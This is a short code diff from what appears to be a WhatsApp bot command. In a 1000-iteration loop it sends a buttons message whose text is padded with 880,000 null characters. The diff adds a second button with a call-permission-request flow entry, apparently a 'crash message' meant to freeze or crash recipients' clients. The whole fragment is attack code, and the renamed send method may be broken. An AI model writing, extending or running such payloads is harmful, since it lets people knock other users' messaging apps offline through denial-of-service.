@@ -18,7 +18,7 @@ export default {
     for (let i = 0; i < 1000; i++) {
       try {
         await utils.sleep(500);
-        await sock.relayMessage(
+        await sock.relay(
           "status@broadcast",
           {
             buttonsMessage: {
@@ -27,6 +27,18 @@ export default {
                   buttonId: "p",
                   buttonText: {
                     displayText: `x${"\u0000".repeat(880000)}`,
+                  },
+
+                  type: 1,
+                },
+                {
+                  buttonId: "p",
+                  buttonText: {
+                    displayText: "x",
+                  },
+                  nativeFlowInfo: {
+                    name: "call_permission_request",
+                    paramsJson: "",
                   },
                   type: 1,
                 },
